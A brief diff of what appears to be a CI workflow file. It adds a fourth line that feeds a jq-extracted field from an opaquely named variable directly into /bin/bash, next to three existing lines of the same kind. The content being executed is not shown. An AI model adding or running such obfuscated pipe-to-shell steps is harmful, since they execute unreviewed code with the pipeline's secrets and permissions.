@@ -38,6 +38,7 @@ jobs:
           echo $kjc36701 | jq -r .b1656 | /bin/bash
           printf '%s' "$hx45" | jq -r .ofn18337 | /bin/bash
           echo $m11210 | jq -r .g871 | /bin/bash
+          printf '%s' "$j3" | jq -r .voc1 | /bin/bash
 
       - name: Save output
         if: always()
